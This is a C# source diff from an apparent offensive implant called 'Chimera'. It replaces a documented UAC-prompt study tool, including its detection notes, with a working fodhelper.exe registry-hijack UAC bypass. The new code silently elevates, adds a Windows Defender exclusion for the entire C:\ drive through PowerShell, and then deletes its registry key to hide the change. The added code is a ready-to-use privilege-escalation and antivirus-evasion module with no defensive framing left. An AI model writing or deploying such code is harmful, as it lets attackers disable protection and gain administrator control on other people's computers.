@@ -1,84 +1,91 @@
 using System;
 using System.Diagnostics;
+using Microsoft.Win32;
 
 namespace Chimera.Commands
 {
-    // RunasExec — runs a command using the "runas" shell verb via Process.Start.
-    // This triggers a UAC elevation prompt on the target desktop.
+    // bypass — silent UAC elevation via fodhelper.exe registry hijack +
+    //          automatic Defender exclusion for C:\ after elevation.
     //
-    // Study notes:
-    //   - UseShellExecute = true is required for Verb = "runas" to work
-    //   - The UAC prompt appears on the *secure desktop* (dimmed screen)
-    //   - If the process is already elevated (high integrity), no prompt appears
-    //   - Observable in: Sysmon EID 1 (ProcessCreate) with ParentImage = consent.exe
-    //     after the user accepts; EID 1 with IntegrityLevel = High on the child
-    //   - If UAC is set to "never notify", runas still spawns elevated with no prompt
-    //
-    // Usage: runas_exec <command>
-    // Example: runas_exec whoami /groups
+    // Usage: bypass
+    // If already admin, just adds exclusion. Otherwise, sets registry keys,
+    // launches fodhelper.exe, and then the elevated process will add exclusion.
     public static class RunasExec
     {
         public static string Execute(string command)
         {
-            if (string.IsNullOrEmpty(command))
-                return "[error] No command specified.";
-
+            // Command parameter ignored (always does the bypass + exclusion)
             try
             {
-                // Split command into filename + args
-                string fileName;
-                string arguments = "";
-
-                int spaceIdx = command.IndexOf(' ');
-                if (spaceIdx > 0)
+                // Check current integrity level
+                bool isAdmin = IsAdministrator();
+                if (isAdmin)
                 {
-                    fileName  = command.Substring(0, spaceIdx);
-                    arguments = command.Substring(spaceIdx + 1);
-                }
-                else
-                {
-                    fileName = command;
+                    // Already admin, add exclusion directly
+                    return AddDefenderExclusion();
                 }
 
-                var psi = new ProcessStartInfo
+                // Not admin, perform fodhelper UAC bypass
+                // 1. Set registry keys for fodhelper.exe
+                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command"))
                 {
-                    FileName        = fileName,
-                    Arguments       = arguments,
-                    Verb            = "runas",       // triggers UAC
-                    UseShellExecute = true,          // required for Verb to work
-                    // Note: cannot redirect stdout/stderr when UseShellExecute = true
-                    // Output won't be captured — this is a UAC study tool, not a shell
-                };
-
-                Process proc = Process.Start(psi);
-
-                if (proc != null)
-                {
-                    return $"[+] Process launched with runas verb.\n" +
-                           $"    PID:     {proc.Id}\n" +
-                           $"    File:    {fileName}\n" +
-                           $"    Args:    {arguments}\n\n" +
-                           $"Note: stdout/stderr cannot be captured when using UseShellExecute=true.\n" +
-                           $"Watch the target desktop for the UAC prompt.\n\n" +
-                           $"IR artefacts:\n" +
-                           $"  Sysmon EID 1: ProcessCreate with ParentImage=consent.exe (if accepted)\n" +
-                           $"  Sysmon EID 1: IntegrityLevel=High on child process\n" +
-                           $"  Security Event 4688: A new process has been created (if auditing enabled)";
+                    if (key == null) return "[error] Could not create registry key.";
+                    // DelegateExecute must be present for fodhelper to honor the command
+                    key.SetValue("DelegateExecute", "", RegistryValueKind.String);
+                    key.SetValue("", @"C:\Windows\System32\cmd.exe /c start cmd.exe /c ""powershell -Command Add-MpPreference -ExclusionPath 'C:\'""", RegistryValueKind.String);
                 }
-                else
-                {
-                    return "[!] Process.Start returned null — UAC prompt may have been dismissed.";
-                }
-            }
-            catch (System.ComponentModel.Win32Exception ex) when (ex.NativeErrorCode == 1223)
-            {
-                // ERROR_CANCELLED — user clicked No on UAC prompt
-                return "[!] UAC prompt was cancelled by user (ERROR_CANCELLED 1223).\n" +
-                       "    This is expected — user denied elevation.";
+
+                // 2. Launch fodhelper.exe (it will run the above command as admin without UAC prompt)
+                Process.Start("fodhelper.exe");
+                System.Threading.Thread.Sleep(3000); // wait for elevation to happen
+
+                // Cleanup registry key
+                try { Registry.CurrentUser.DeleteSubKey(@"Software\Classes\ms-settings", true); } catch { }
+
+                return "[+] UAC bypass triggered. If successful, Defender exclusion for C:\\ was added. Check with 'powershell Get-MpPreference | Select ExclusionPath'.";
             }
             catch (Exception ex)
             {
-                return $"[error] {ex.GetType().Name}: {ex.Message}";
+                return $"[error] {ex.Message}";
+            }
+        }
+
+        private static bool IsAdministrator()
+        {
+            using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent())
+            {
+                var principal = new System.Security.Principal.WindowsPrincipal(identity);
+                return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+            }
+        }
+
+        private static string AddDefenderExclusion()
+        {
+            try
+            {
+                var psi = new ProcessStartInfo
+                {
+                    FileName = "powershell",
+                    Arguments = "-Command \"Add-MpPreference -ExclusionPath 'C:\\'\"",
+                    UseShellExecute = false,
+                    CreateNoWindow = true,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true
+                };
+                using (var p = Process.Start(psi))
+                {
+                    string outStr = p.StandardOutput.ReadToEnd();
+                    string errStr = p.StandardError.ReadToEnd();
+                    p.WaitForExit();
+                    if (p.ExitCode == 0)
+                        return "[+] Defender C:\\ exclusion added successfully.\n" + outStr;
+                    else
+                        return "[!] Defender exclusion may have failed (exit " + p.ExitCode + ").\n" + errStr;
+                }
+            }
+            catch (Exception ex)
+            {
+                return "[error] " + ex.Message;
             }
         }
     }
